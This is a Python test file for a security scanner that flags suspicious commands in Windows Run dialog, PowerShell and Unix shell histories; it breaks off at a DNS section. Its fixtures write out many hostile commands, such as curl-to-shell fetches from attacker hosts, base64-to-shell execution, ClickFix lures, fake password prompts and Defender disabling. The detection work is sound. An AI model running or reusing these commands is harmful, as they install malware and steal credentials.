    command = f"powershell -c \"iwr https://evil.example/a?token=abcd1234 -Headers @{{x='{gh_token()}'}} | iex\" -enc {b64_payload(90)}"
    f = tr.run_finding(make_entry(command), tr.classify_run_command(command), NOW)
    blob = dump([f])
    for secret in ("abcd1234", gh_token(), b64_payload(90), "SQBFAFgA"):
        assert secret not in blob


def test_run_finding_caps_a_very_long_command():
    command = "powershell -c \"iwr https://evil.example/a | iex\" # " + "I am not a robot " * 200
    f = tr.run_finding(make_entry(command), tr.classify_run_command(command), NOW)
    assert len(f.evidence["command"]) <= tr.COMMAND_CHARS and len(f.evidence["lure_text"]) <= 160


def test_run_finding_description_fits_the_severity():
    lure = tr.run_finding(make_entry(CLICKFIX_LURE), tr.classify_run_command(CLICKFIX_LURE), NOW).description
    plain = tr.run_finding(make_entry("mshta https://evil.example/c.hta", "a", 2), tr.classify_run_command(
        "mshta https://evil.example/c.hta"), NOW).description
    medium = tr.run_finding(make_entry("net user bob /add", "a", 2), tr.classify_run_command("net user bob /add"), NOW).description
    assert "text after the # is added" in lure and "text after the # is added" not in plain
    assert "ClickFix" in plain and "No genuine CAPTCHA" in plain
    assert "Administrators sometimes type" in medium and "malware" not in medium and "No genuine CAPTCHA" not in medium
    for text in (lure, plain, medium):
        assert text.count("What stands out:") == 1 and "  " not in text


# =========================================================================== 1. Run dialog check
RUN_VALUES = {
    "a": "notepad\\1",
    "b": CLICKFIX_LURE + "\\1",
    "c": "regedit\\1",
    "d": "mshta https://evil.example/x.hta\\1",
    "MRUList": "bdac",
}


def test_check_run_history_flow(ctx, monkeypatch):
    monkeypatch.setattr(tr, "IS_WINDOWS", True)
    monkeypatch.setattr(tr, "read_runmru", lambda: dict(RUN_VALUES))
    monkeypatch.setattr(tr, "read_runmru_last_write", lambda: NOW)
    findings, checks = split(tr.check_run_history(ctx))
    assert [(f.severity.name, f.evidence["value_name"], f.evidence["position"]) for f in findings] == [
        ("CRITICAL", "b", 1), ("HIGH", "d", 2)]
    assert findings[0].evidence["last_registry_write"] and findings[1].evidence["last_registry_write"] is None
    assert len(checks) == 1 and checks[0].check_id == "AEG-TRACE-RUNMRU" and checks[0].status == CheckStatus.FAIL
    assert checks[0].category == Category.SUSPICIOUS and "4 Run dialog commands examined: 2 suspicious" in checks[0].detail
    assert ctx.stats["traces_run_entries"] == 4 and ctx.stats["traces_flagged"] == 2

    monkeypatch.setattr(tr, "read_runmru", lambda: {**RUN_VALUES, "e": "zzbenign-run-command\\1", "MRUList": "bdace"})
    assert "zzbenign" not in dump(split(tr.check_run_history(ctx))[0])  # only the matching entries are reported


def test_check_run_history_clean_empty_and_non_windows(ctx, monkeypatch):
    monkeypatch.setattr(tr, "IS_WINDOWS", True)
    monkeypatch.setattr(tr, "read_runmru", lambda: {"a": "notepad\\1", "b": "https://example.com\\1", "MRUList": "ba"})
    findings, checks = split(tr.check_run_history(ctx))
    assert findings == [] and checks[0].status == CheckStatus.PASS and "2 Run dialog commands examined" in checks[0].detail
    monkeypatch.setattr(tr, "read_runmru", lambda: {})
    findings, checks = split(tr.check_run_history(ctx))
    assert findings == [] and checks[0].status == CheckStatus.PASS and "empty" in checks[0].detail
    monkeypatch.setattr(tr, "IS_WINDOWS", False)
    findings, checks = split(tr.check_run_history(ctx))
    assert findings == [] and checks[0].status == CheckStatus.SKIP and "Windows" in checks[0].detail


def test_check_run_history_stops_when_cancelled(ctx, monkeypatch):
    monkeypatch.setattr(tr, "IS_WINDOWS", True)
    monkeypatch.setattr(tr, "read_runmru", lambda: dict(RUN_VALUES))
    monkeypatch.setattr(tr, "read_runmru_last_write", lambda: NOW)
    ctx.cancel.set()
    assert list(tr.check_run_history(ctx)) == []


def test_runmru_last_write_is_none_off_windows():
    if sys.platform.startswith("win"):
        assert tr.read_runmru_last_write() is None or isinstance(tr.read_runmru_last_write(), dt.datetime)
    else:
        assert tr.read_runmru_last_write() is None and tr.read_runmru() == {}


# =========================================================================== history files: reading
def write_lines(path, lines, newline="\n", encoding="utf-8"):
    path.write_bytes((newline.join(lines) + newline).encode(encoding))
    return path


def test_read_history_tail_returns_the_last_lines_only(tmp_path):
    path = write_lines(tmp_path / "h.txt", [f"line {i}" for i in range(8000)])
    tail = tr.read_history_tail(path)
    assert len(tail.lines) == tr.MAX_HISTORY_LINES == 5000
    assert tail.lines[0] == "line 3000" and tail.lines[-1] == "line 7999" and tail.truncated and not tail.error
    small = tr.read_history_tail(write_lines(tmp_path / "s.txt", ["a", "b", "c"]))
    assert small.lines == ["a", "b", "c"] and not small.truncated and small.size == 6
    assert tr.read_history_tail(path, max_lines=10).lines[-1] == "line 7999"


def test_read_history_tail_reads_at_most_the_end_of_a_big_file(tmp_path):
    lines = [f"command number {i:06d}" for i in range(2000)]
    path = write_lines(tmp_path / "h.txt", lines)
    tail = tr.read_history_tail(path, max_lines=5000, max_bytes=1000)
    assert tail.truncated and 0 < len(tail.lines) < 60 and tail.lines[-1] == "command number 001999"
    assert all(re.fullmatch(r"command number \d{6}", line) for line in tail.lines)  # the cut first line is dropped


def test_read_history_tail_skips_a_file_that_is_too_big(tmp_path):
    path = write_lines(tmp_path / "huge.txt", ["x" * 100] * 50)
    tail = tr.read_history_tail(path, max_file=1000)
    assert tail.lines == [] and "larger than" in tail.error and tail.size > 1000


def test_read_history_tail_handles_encodings_and_line_endings(tmp_path):
    crlf = write_lines(tmp_path / "crlf.txt", ["one", "two"], newline="\r\n")
    assert tr.read_history_tail(crlf).lines == ["one", "two"]
    bom = tmp_path / "bom.txt"
    bom.write_bytes(b"\xef\xbb\xbfone\ntwo\n")
    assert tr.read_history_tail(bom).lines == ["one", "two"]
    utf16 = tmp_path / "u16.txt"
    utf16.write_bytes("one\r\ntwo\r\n".encode("utf-16"))
    assert tr.read_history_tail(utf16).lines == ["one", "two"]
    bad = tmp_path / "bad.txt"
    bad.write_bytes(b"ok\n\xff\xfe\xfdbroken\nfine\n")
    assert tr.read_history_tail(bad).lines[-1] == "fine"
    assert tr.read_history_tail(tmp_path / "empty.txt").error  # does not exist
    (tmp_path / "e.txt").write_bytes(b"")
    assert tr.read_history_tail(tmp_path / "e.txt").lines == []


def test_read_history_tail_reads_the_end_of_a_big_utf16_file(tmp_path):
    lines = [f"command number {i:05d}" for i in range(3000)]
    for encoding in ("utf-16", "utf-16-be"):
        path = tmp_path / f"{encoding}.txt"
        path.write_bytes((b"\xfe\xff" if encoding == "utf-16-be" else b"") + ("\r\n".join(lines) + "\r\n").encode(encoding))
        tail = tr.read_history_tail(path, max_bytes=2001)  # an odd limit must not split a character
        assert tail.truncated and tail.lines[-1] == "command number 02999" and 5 < len(tail.lines) < 70, encoding
        assert all(re.fullmatch(r"command number \d{5}", line) for line in tail.lines), encoding


def test_read_history_tail_reports_unreadable_files(tmp_path):
    out = tr.read_history_tail(tmp_path)  # a directory
    assert out.lines == [] and out.error.startswith("could not be read")


# =========================================================================== history files: parsing
def test_parse_psreadline_joins_backtick_continued_lines():
    lines = ["Get-Date", "", "Invoke-Thing `", "  -Name x `", "  -Force", "iwr https://example.com | iex", "echo ``", "last `"]
    got = [e.command for e in tr.parse_psreadline(lines)]
    assert got == ["Get-Date", "Invoke-Thing -Name x -Force", "iwr https://example.com | iex", "echo ``", "last"]
    assert all(e.when is None for e in tr.parse_psreadline(lines))


def test_parse_bash_history_with_and_without_time_stamps():
    lines = ["ls -la", "#1760000000", "curl x", "#1760000100", "echo a \\", "  b", "#notatime", "plain"]
    got = [(e.command, e.when) for e in tr.parse_bash_history(lines)]
    assert got == [("ls -la", None), ("curl x", dt.datetime(2025, 10, 9, 8, 53, 20, tzinfo=UTC)),
                   ("echo a b", dt.datetime(2025, 10, 9, 8, 55, tzinfo=UTC)), ("#notatime", None), ("plain", None)]


def test_parse_zsh_history_extended_plain_and_multiline():
    lines = [": 1760000000:0;ls -la", ": 1760000001:2;curl -s https://x.example/i.sh \\", "| bash", "plain command",
             ": 1760000002:0;echo a\\\\", ": 1760000003:0;", ": 1760000004:0;echo ; with semicolon"]
    got = [(e.command, e.when and e.when.second) for e in tr.parse_zsh_history(lines)]
    assert got == [("ls -la", 20), ("curl -s https://x.example/i.sh | bash", 21), ("plain command", None),
                   ("echo a\\\\", 22), ("echo ; with semicolon", 24)]  # an escaped backslash is not a continuation


def test_parse_zsh_history_continuation_keeps_the_time_of_the_first_line():
    got = tr.parse_zsh_history([": 1760000000:0;one \\", "two \\", "three", ": 1760000009:0;next"])
    assert [e.command for e in got] == ["one two three", "next"] and got[0].when.second == 20


def test_parse_fish_history_escapes_and_times():
    lines = ["- cmd: ls -la", "  when: 1760000000", "- cmd: curl http://x.example/a |\\nsh", "  when: 1760000001",
             "  paths:", "    - /tmp/x", "- cmd: echo a\\\\nb", "  when: 1760000002", "- cmd: echo one\\ntwo", "- cmd:"]
    got = [(e.command, e.when and e.when.second) for e in tr.parse_fish_history(lines)]
    assert got == [("ls -la", 20), ("curl http://x.example/a | sh", 21), ("echo a\\nb", 22), ("echo one ; two", None)]


def test_parse_fish_history_ignores_other_lines():
    assert tr.parse_fish_history(["---", "garbage", "  when: 5"]) == []


# =========================================================================== history files: discovery
def test_powershell_history_files_windows_and_unix(tmp_path):
    roaming = tmp_path / "Roaming"
    folder = roaming / "Microsoft" / "Windows" / "PowerShell" / "PSReadLine"
    folder.mkdir(parents=True)
    for name in ("Visual Studio Code Host_history.txt", "ConsoleHost_history.txt", "other.txt"):
        (folder / name).write_text("x", encoding="utf-8")
    files = tr.powershell_history_files("windows", tmp_path, {"APPDATA": str(roaming)})
    assert [p.name for p in files] == ["ConsoleHost_history.txt", "Visual Studio Code Host_history.txt"]
    assert tr.powershell_history_files("windows", tmp_path / "nobody", {}) == []
    unix = tmp_path / ".local" / "share" / "powershell" / "PSReadLine"
    unix.mkdir(parents=True)
    (unix / "ConsoleHost_history.txt").write_text("x", encoding="utf-8")
    assert [p.name for p in tr.powershell_history_files("linux", tmp_path, {})] == ["ConsoleHost_history.txt"]
    assert [p.name for p in tr.powershell_history_files("darwin", tmp_path, {})] == ["ConsoleHost_history.txt"]
    data = tmp_path / "xdg"
    (data / "powershell" / "PSReadLine").mkdir(parents=True)
    (data / "powershell" / "PSReadLine" / "ConsoleHost_history.txt").write_text("x", encoding="utf-8")
    assert tr.powershell_history_files("linux", tmp_path, {"XDG_DATA_HOME": str(data)})[0].is_relative_to(data)


def test_unix_history_files(tmp_path):
    (tmp_path / ".bash_history").write_text("x", encoding="utf-8")
    (tmp_path / ".zsh_history").write_text("x", encoding="utf-8")
    fish = tmp_path / ".local" / "share" / "fish"
    fish.mkdir(parents=True)
    (fish / "fish_history").write_text("x", encoding="utf-8")
    got = tr.unix_history_files(tmp_path, {})
    assert [(shell, p.name) for shell, p in got] == [("bash", ".bash_history"), ("zsh", ".zsh_history"), ("fish", "fish_history")]
    zdot = tmp_path / "zdot"
    zdot.mkdir()
    (zdot / ".zsh_history").write_text("x", encoding="utf-8")
    got = tr.unix_history_files(tmp_path, {"ZDOTDIR": str(zdot)})
    assert [p for shell, p in got if shell == "zsh"] == [zdot / ".zsh_history", tmp_path / ".zsh_history"]
    # the same file reached two ways is read once
    assert len(tr.unix_history_files(tmp_path, {"ZDOTDIR": str(tmp_path), "XDG_DATA_HOME": str(tmp_path / ".local" / "share")})) == 3
    assert tr.unix_history_files(tmp_path / "nobody", {}) == []


# =========================================================================== 3. Unix command classification
UNIX_POSITIVE = [
    (f"curl -fsSL http://{IP}/install.sh | sh", "HIGH", "fetch-exec"),
    (f"curl -sSL {IP}/x | sh", "HIGH", "fetch-exec"),
    ("curl http://1572395042/x | sh", "HIGH", "fetch-exec"),  # the same address written as one number
    ("wget -qO- http://0x5db8d822/x | bash", "HIGH", "fetch-exec"),
    (f"wget -qO- http://{IP}:8080/x.sh | sudo bash -s -- --yes", "HIGH", "fetch-exec"),
    ("curl -s https://evil.example/a.sh | bash", "CRITICAL", "fetch-exec-bad-domain"),
    ("curl https://cdn.evil.example/x.sh|zsh", "CRITICAL", "fetch-exec-bad-domain"),
    ("wget -qO- https://pastebin.com/raw/abcd | sh", "HIGH", "fetch-exec"),
    ("curl -s https://transfer.sh/abc/x.sh | bash", "HIGH", "fetch-exec"),
    ("curl https://temp.sh/abc/x.sh | bash", "HIGH", "fetch-exec"),
    ("curl https://file.io/abc | sh", "HIGH", "fetch-exec"),
    ("curl https://0x0.st/abcd.sh | sh", "HIGH", "fetch-exec"),
    ("curl https://abcd-1-2-3-4.ngrok-free.app/i.sh | sh", "HIGH", "fetch-exec"),
    ("curl https://random-words.trycloudflare.com/i.sh | sh", "HIGH", "fetch-exec"),
    ("curl https://cdn.discordapp.com/attachments/1/2/x.sh | bash", "HIGH", "fetch-exec"),
    ("bash <(curl -s https://transfer.sh/abc/x.sh)", "HIGH", "fetch-exec"),
    ("/bin/bash -c \"$(curl -fsSL https://x.ngrok-free.app/i.sh)\"", "HIGH", "fetch-exec"),
    (f"sh -c \"$(curl -fsSL 'http://{IP}:8080/x?a=1&b=2')\"", "HIGH", "fetch-exec"),
    ("source <(curl -s https://pastebin.com/raw/x)", "HIGH", "fetch-exec"),
    ("eval \"$(curl -s https://paste.ee/r/x)\"", "HIGH", "fetch-exec"),
    ("echo ZWNobyBoZWxsbyB3b3JsZA== | base64 -d | sh", "HIGH", "b64-exec"),
    ("echo ZWNobyBoZWxsbyB3b3JsZA== | base64 -D | zsh", "HIGH", "b64-exec"),
    ("echo ZWNobyBoZWxsbw== | base64 --decode | sudo bash", "HIGH", "b64-exec"),
    ("base64 -d <<< 'ZWNobyBoZWxsbw==' | bash", "HIGH", "b64-exec"),
    ("eval \"$(echo ZWNobyBoZWxsbw== | base64 -d)\"", "HIGH", "b64-exec"),
    ("osascript -e 'display dialog \"Enter your password to continue\" default answer \"\" with hidden answer'", "HIGH",
     "osascript-prompt"),
    ("osascript -e 'tell app \"System Events\" to display dialog \"Password:\" with icon caution default answer \"\" "
     "with hidden answer'", "HIGH", "osascript-prompt"),
    ("xattr -c /tmp/payload && chmod +x /tmp/payload && /tmp/payload", "HIGH", "quarantine-strip-exec"),
    ("xattr -d com.apple.quarantine /tmp/x; /tmp/x", "HIGH", "quarantine-strip-exec"),
    ("xattr -cr /private/tmp/App.app && open /private/tmp/App.app", "HIGH", "quarantine-strip-exec"),
    ("xattr -cr ~/Downloads/App.app && open ~/Downloads/App.app", "MEDIUM", "quarantine-strip-exec"),
    ("xattr -d com.apple.quarantine /Users/bob/Downloads/a && /Users/bob/Downloads/a", "MEDIUM", "quarantine-strip-exec"),
    ("chmod +x /tmp/x && /tmp/x", "MEDIUM", "drop-exec"),
    ("chmod 755 /dev/shm/.k; nohup /dev/shm/.k &", "MEDIUM", "drop-exec"),
    ("cd /tmp && chmod +x x && ./x", "MEDIUM", "drop-exec"),
    (f"curl -o /tmp/x http://{IP}/x && chmod +x /tmp/x && /tmp/x", "HIGH", "drop-exec"),
    (f"wget -O /var/tmp/x http://{IP}/x; chmod 755 /var/tmp/x; /var/tmp/x", "HIGH", "drop-exec"),
]


@pytest.mark.parametrize("command,severity,key", UNIX_POSITIVE)
def test_classify_unix_command_positive(command, severity, key):
    v = tr.classify_unix_command(command, FakeSigs(["evil.example"]).is_bad_domain)
    assert v is not None, command
    assert v.severity.name == severity, (command, v.severity.name, v.keys)
    assert key in v.keys, (command, v.keys)
    assert v.mitre and all(re.fullmatch(r"T1\d{3}(\.\d{3})?", m) for m in v.mitre)


UNIX_NEGATIVE = [
    # developers run installers from well-known hosts all the time
    "curl -fsSL https://get.docker.com | sh", "curl -fsSL get.docker.com | sh", "curl https://sh.rustup.rs -sSf | sh",
    "curl -fsSL https://astral.sh/uv/install.sh | sh", "curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -",
    "/bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\"",
    "curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.7/install.sh | bash",
    "wget -qO- https://example.com/install.sh | bash",
    # local development servers and the LAN are not an attacker's host
    "curl -fsSL http://192.168.1.10:8000/install.sh | sh", "curl http://localhost:3000/x | sh", "curl http://127.0.0.1/x | bash",
    "curl http://10.0.0.5/x | sh", "curl -s http://169.254.169.254/latest/meta-data | sh",
    # a download that is not run
    "curl -o x.html https://example.com", f"curl -o /tmp/x http://{IP}/x", f"wget -O out.tar.gz http://{IP}/x.tar.gz",
    "curl https://pastebin.com/raw/abcd", "curl https://pastebin.com/raw/abcd | less",
    # base64 without a shell
    "echo hello | base64", "base64 -d file.b64 > out", "echo aGk= | base64 -d", "base64 -d < secret.b64 | gpg --decrypt",
    # osascript that is not a fake password prompt
    "osascript -e 'display notification \"done\"'", "osascript -e 'display dialog \"Hello\"'",
    "osascript -e 'tell application \"Finder\" to quit'",
    # quarantine handling that does not run a file from a temporary folder
    "xattr -cr /Applications/Foo.app", "xattr -l file", "xattr -p com.apple.quarantine x",
    "xattr -d com.apple.quarantine /Applications/Foo.app",
    # chmod outside the drop folders / without running the file
    "chmod +x ./script.sh && ./script.sh", "chmod +x /usr/local/bin/tool", "chmod +x /tmp/x", "chmod 644 /tmp/x && cat /tmp/x",
    "ls -la /tmp", "git status", "git commit -m 'curl x | sh'", "docker ps | grep foo", "ssh bob@host", "python3 -m pytest -q",
    "", "ab",
]


@pytest.mark.parametrize("command", UNIX_NEGATIVE)
def test_classify_unix_command_negative(command):
    assert tr.classify_unix_command(command, FakeSigs(["evil.example"]).is_bad_domain) is None, command


def test_unix_bad_domain_needs_a_threat_feed():
    assert tr.classify_unix_command("curl -s https://evil.example/a.sh | bash") is None  # no feed: no verdict on the domain
    assert tr.classify_unix_command("curl -s https://evil.example/a.sh | bash", lambda d: False) is None
    v = tr.classify_unix_command("curl -s https://evil.example/a.sh | bash", lambda d: d == "evil.example")
    assert v.severity == Severity.CRITICAL and "evil.example" in v.reasons[0]


def test_unix_verdict_names_the_host_and_class():
    host = lambda c: tr.classify_unix_command(c, FakeSigs(["evil.example"]).is_bad_domain).reasons[0]  # noqa: E731
    assert f"raw IP address ({IP})" in host(f"curl http://{IP}/x | sh")
    assert "known-malicious domain (evil.example)" in host("curl https://evil.example/x | sh")
    assert "free file-sharing, paste or tunnel service (transfer.sh)" in host("curl https://transfer.sh/x | sh")


def test_classify_fetch_host():
    bad = FakeSigs(["evil.example"]).is_bad_domain
    assert tr.classify_fetch_host(IP) == (f"a raw IP address ({IP})", Severity.HIGH)
    assert tr.classify_fetch_host("2606:4700:4700::1111")[1] == Severity.HIGH
    assert tr.classify_fetch_host("sub.evil.example", bad)[1] == Severity.CRITICAL
    assert tr.classify_fetch_host("EVIL.example.", bad)[1] == Severity.CRITICAL
    assert tr.classify_fetch_host("x.transfer.sh")[1] == Severity.HIGH
    assert tr.classify_fetch_host("1572395042") == (f"a raw IP address ({IP})", Severity.HIGH)
    assert tr.classify_fetch_host("0x5db8d822") == (f"a raw IP address ({IP})", Severity.HIGH)
    for ok in ("2130706433", "0x7f000001", "99999999999", "12345678", "192.168.0.1", "10.1.2.3", "172.16.0.9", "127.0.0.1",
               "::1", "169.254.1.1", "fe80::1", "0.0.0.0",
               "get.docker.com", "example.com", "nottransfer.sh", "transfer.sh.example.com", "github.com"):
        assert tr.classify_fetch_host(ok, bad) is None, ok


def test_fetch_hosts_reads_urls_and_scheme_less_addresses():
    assert tr.fetch_hosts("-fsSL https://Evil.example/a.sh") == ["evil.example"]
    assert tr.fetch_hosts("-s 'https://a.example/x?q=1&r=2' -o -") == ["a.example"]
    assert tr.fetch_hosts("--url=https://a.example/x -L") == ["a.example"]
    assert tr.fetch_hosts("-sSL get.docker.com") == ["get.docker.com"]
    assert tr.fetch_hosts(f"-sSL {IP}:8080/x") == [IP]
    assert tr.fetch_hosts("-H 'Accept: text/plain' -o /tmp/out") == []
    assert tr.classify_fetch_host(tr.fetch_hosts("-o out.sh https://get.docker.com")[0]) is None  # a file name is harmless
    assert tr.fetch_hosts("http://[2606:4700:4700::1111]:80/x") == ["2606:4700:4700::1111"]


# =========================================================================== grouping history hits
def entry(command, when=None):
    return tr.HistoryEntry(command, when)


def test_scan_history_groups_duplicates_and_orders_hits():
    entries = [entry("git status"), entry(f"curl http://{IP}/a | sh"), entry("ls"), entry(f"curl http://{IP}/a | sh"),
               entry("chmod +x /tmp/x && /tmp/x"), entry("echo hi"), entry("curl -s https://evil.example/a.sh | bash")]
    bad = FakeSigs(["evil.example"]).is_bad_domain
    scan = tr.scan_history(entries, lambda c: tr.classify_unix_command(c, bad))
    assert scan.examined == 7 and scan.occurrences == 4 and len(scan.by_command) == 3 and not scan.cancelled
    hits = scan.hits
    assert [h.severity.name for h in hits] == ["CRITICAL", "HIGH", "MEDIUM"]  # most severe first
    assert hits[1].count == 2 and scan.severity == Severity.CRITICAL
    assert tr.scan_history([], tr.classify_powershell_line).hits == [] and tr.HistoryScan().severity == Severity.INFO


def test_scan_history_keeps_masked_commands_only_and_the_newest_time():
    t1, t2 = dt.datetime(2026, 9, 1, tzinfo=UTC), dt.datetime(2026, 9, 2, tzinfo=UTC)
    cmd = f"curl 'http://{IP}/a?token=SECRETVALUE' --password hunter2xyz | sh"
    scan = tr.scan_history([entry(cmd, t2), entry(cmd, t1)], tr.classify_unix_command)
    (hit,) = scan.hits
    assert "SECRETVALUE" not in hit.command and "hunter2xyz" not in hit.command and hit.when == t2 and hit.count == 2


def test_scan_history_can_be_stopped():
    calls = iter([False, True])
    scan = tr.scan_history([entry("ls")] * 1000, tr.classify_unix_command, lambda: next(calls))
    assert scan.cancelled and scan.examined == 200


def test_scan_history_skips_tiny_lines():
    seen = []
    tr.scan_history([entry("ls"), entry("cd"), entry("")], lambda c: seen.append(c))
    assert seen == []


def history_hit_commands(n, secret=False):
    extra = f"?token={gh_token()}" if secret else ""
    return [entry(f"curl -s http://{IP}/p{i}.sh{extra} | sh", dt.datetime(2026, 9, 1, tzinfo=UTC) + dt.timedelta(minutes=i))
            for i in range(n)]


def test_shell_history_finding_caps_examples_and_stays_one_finding():
    entries = [entry(f"echo zzbenign{i}") for i in range(50)] + history_hit_commands(300, secret=True)
    scan = tr.scan_history(entries, tr.classify_unix_command)
    path = Path("/home/bob/.bash_history")
    f = tr.shell_history_finding("bash", path, scan, 350)
    assert f.rule_id == "AEG-TRACE-SHELLHISTORY" and f.category == Category.SUSPICIOUS and f.severity == Severity.HIGH
    assert f.title == "Suspicious commands found in the bash history (.bash_history)" and f.location == str(path)
    ev = f.evidence
    assert ev["flagged_commands"] == 300 and ev["flagged_occurrences"] == 300 and len(ev["examples"]) == tr.MAX_EXAMPLES == 10
    assert ev["examples_shown"] == 10 and ev["lines_examined"] == 350 and ev["file"] == str(path)
    assert "10 most serious" in f.description and "300 distinct commands" in f.description
    blob = dump([f])
    assert gh_token() not in blob and "zzbenign" not in blob  # secrets masked; non-matching lines never reported
    assert f.mitre[:3] == ["T1105", "T1059.004", "T1204.004"] and f.remediation is None
    assert all(set(e) == {"command", "severity", "reasons", "when", "times_seen"} for e in ev["examples"])
    assert ev["examples"][0]["when"] and ev["examples"][0]["times_seen"] == 1


def test_powershell_history_finding_is_one_per_file_with_the_worst_severity():
    lines = ["iwr https://evil.example/a | iex", "Set-MpPreference -DisableRealtimeMonitoring $true", "Invoke-Mimikatz",
             "git status"] + [f"iex (irm https://evil{i}.example/x)" for i in range(40)]
    scan = tr.scan_history(tr.parse_psreadline(lines), tr.classify_powershell_line)
    path = Path("C:/Users/bob/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt")
    f = tr.powershell_history_finding(path, scan, len(lines), truncated=True)
    assert f.rule_id == "AEG-TRACE-PSHISTORY" and f.severity == Severity.CRITICAL and f.location == str(path)
    assert f.title == "Suspicious commands found in the PowerShell history (ConsoleHost_history.txt)"
    assert f.evidence["flagged_commands"] == 43 and len(f.evidence["examples"]) == 10 and f.evidence["older_lines_not_read"]
    assert f.evidence["examples"][0]["severity"] == "critical"  # the most serious come first
    assert "git status" not in dump([f]) and "T1059.001" in f.mitre
    assert "Defender" in " ".join(f.evidence["patterns"]) or any("defender" in k.lower() for k in f.evidence["patterns"])
    assert f.recommendation and f.description and f.remediation is None


def test_history_finding_mentions_the_most_recent_time():
    when = dt.datetime(2026, 10, 1, 8, 30, tzinfo=UTC)
    scan = tr.scan_history([entry(f"curl http://{IP}/a | sh", when)], tr.classify_unix_command)
    f = tr.shell_history_finding("zsh", Path("/home/bob/.zsh_history"), scan, 1)
    assert "2026-10-01 08:30 UTC" in f.description and "1 distinct command " in f.description


# =========================================================================== 2 + 3. history checks
def fake_ps_world(tmp_path, monkeypatch, files):
    paths = []
    for name, lines in files.items():
        paths.append(write_lines(tmp_path / name, lines))
    monkeypatch.setattr(tr, "powershell_history_files", lambda: paths)
    return paths


def test_check_powershell_history_one_finding_per_file(ctx, tmp_path, monkeypatch):
    hot = ["Get-Date", "zzbenign line"] + [f"iex (irm https://evil{i}.example/x)" for i in range(200)]
    paths = fake_ps_world(tmp_path, monkeypatch, {
        "ConsoleHost_history.txt": hot,
        "Visual Studio Code Host_history.txt": ["git status", "Set-MpPreference -DisableRealtimeMonitoring $true"],
        "clean_history.txt": ["Get-ChildItem", "iwr https://astral.sh/uv/install.ps1 | iex"]})
    findings, checks = split(tr.check_powershell_history(ctx))
    assert [f.location for f in findings] == [str(paths[0]), str(paths[1])] and rules(findings) == ["AEG-TRACE-PSHISTORY"] * 2
    assert findings[0].evidence["flagged_commands"] == 200 and len(findings[0].evidence["examples"]) == 10
    assert len(checks) == 1 and checks[0].status == CheckStatus.FAIL and checks[0].check_id == "AEG-TRACE-PSHISTORY"
    assert "3 history files" in checks[0].detail and "2 files" in checks[0].detail
    assert ctx.stats["traces_history_lines"] == 202 + 2 + 2
    assert "zzbenign" not in dump(findings)


def test_check_powershell_history_scans_only_the_recent_lines(ctx, tmp_path, monkeypatch):
    old_hits = ["iex (irm https://evil.example/old)"] * 1000
    benign = [f"Get-Item {i}" for i in range(5000)]
    fake_ps_world(tmp_path, monkeypatch, {"ConsoleHost_history.txt": old_hits + benign})
    findings, checks = split(tr.check_powershell_history(ctx))
    assert findings == [] and checks[0].status == CheckStatus.PASS and ctx.stats["traces_history_lines"] == 5000
    fake_ps_world(tmp_path, monkeypatch, {"ConsoleHost_history.txt": benign + old_hits})
    findings, checks = split(tr.check_powershell_history(ctx))
    assert len(findings) == 1 and findings[0].evidence["older_lines_not_read"] and findings[0].evidence["flagged_commands"] == 1


def test_check_powershell_history_skip_note_and_cancel(ctx, tmp_path, monkeypatch):
    monkeypatch.setattr(tr, "powershell_history_files", lambda: [])
    findings, checks = split(tr.check_powershell_history(ctx))
    assert findings == [] and checks[0].status == CheckStatus.SKIP and "PSReadLine" in checks[0].detail
    big = tmp_path / "ConsoleHost_history.txt"
    big.write_bytes(b"x" * 100)
    monkeypatch.setattr(tr, "powershell_history_files", lambda: [big])
    monkeypatch.setattr(tr, "MAX_HISTORY_FILE", 10)
    findings, checks = split(tr.check_powershell_history(ctx))
    assert findings == [] and checks[0].status == CheckStatus.PASS and "Skipped: ConsoleHost_history.txt larger than" in checks[0].detail
    ctx.cancel.set()
    assert list(tr.check_powershell_history(ctx)) == []


def test_check_shell_history_flow(ctx, tmp_path, monkeypatch):
    ctx.signatures.bad_domains.add("evil.example")
    bash = write_lines(tmp_path / ".bash_history", ["ls", "#1760000000", f"curl -s http://{IP}/x | sh", "echo zzbenign"])
    zsh = write_lines(tmp_path / ".zsh_history", [": 1760000000:0;git status",
                                                  ": 1760000001:0;curl -s https://evil.example/a.sh | bash"])
    fish = write_lines(tmp_path / "fish_history", ["- cmd: ls", "  when: 1", "- cmd: echo hi", "  when: 2"])
    monkeypatch.setattr(tr, "IS_WINDOWS", False)
    monkeypatch.setattr(tr, "unix_history_files", lambda: [("bash", bash), ("zsh", zsh), ("fish", fish)])
    findings, checks = split(tr.check_shell_history(ctx))
    assert [(f.location, f.severity.name) for f in findings] == [(str(bash), "HIGH"), (str(zsh), "CRITICAL")]
    assert checks[0].check_id == "AEG-TRACE-SHELLHISTORY" and checks[0].status == CheckStatus.FAIL
    assert "3 history files" in checks[0].detail and "known-malicious domains is off" not in checks[0].detail
    assert findings[0].evidence["examples"][0]["when"] == "2025-10-09T08:53:20+00:00"
    assert "zzbenign" not in dump(findings) and ctx.stats["traces_history_lines"] >= 6


def test_check_shell_history_without_a_feed_says_so(ctx, tmp_path, monkeypatch):
    zsh = write_lines(tmp_path / ".zsh_history", [": 1760000001:0;curl -s https://evil.example/a.sh | bash", "ls -la"])
    monkeypatch.setattr(tr, "IS_WINDOWS", False)
    monkeypatch.setattr(tr, "unix_history_files", lambda: [("zsh", zsh)])
    findings, checks = split(tr.check_shell_history(ctx))
    assert findings == [] and checks[0].status == CheckStatus.PASS
    assert "no threat feed is loaded" in checks[0].detail and "aegis update" in checks[0].detail


def test_check_shell_history_skips_and_cancels(ctx, tmp_path, monkeypatch):
    monkeypatch.setattr(tr, "IS_WINDOWS", True)
    findings, checks = split(tr.check_shell_history(ctx))
    assert findings == [] and checks[0].status == CheckStatus.SKIP and "Linux and macOS" in checks[0].detail
    monkeypatch.setattr(tr, "IS_WINDOWS", False)
    monkeypatch.setattr(tr, "unix_history_files", lambda: [])
    findings, checks = split(tr.check_shell_history(ctx))
    assert checks[0].status == CheckStatus.SKIP and "No bash, zsh or fish history" in checks[0].detail
    bash = write_lines(tmp_path / ".bash_history", [f"curl -s http://{IP}/x | sh"])
    monkeypatch.setattr(tr, "unix_history_files", lambda: [("bash", bash)])
    ctx.cancel.set()
    assert list(tr.check_shell_history(ctx)) == []


# =========================================================================== 4. DNS cache
DNS_ROWS = [
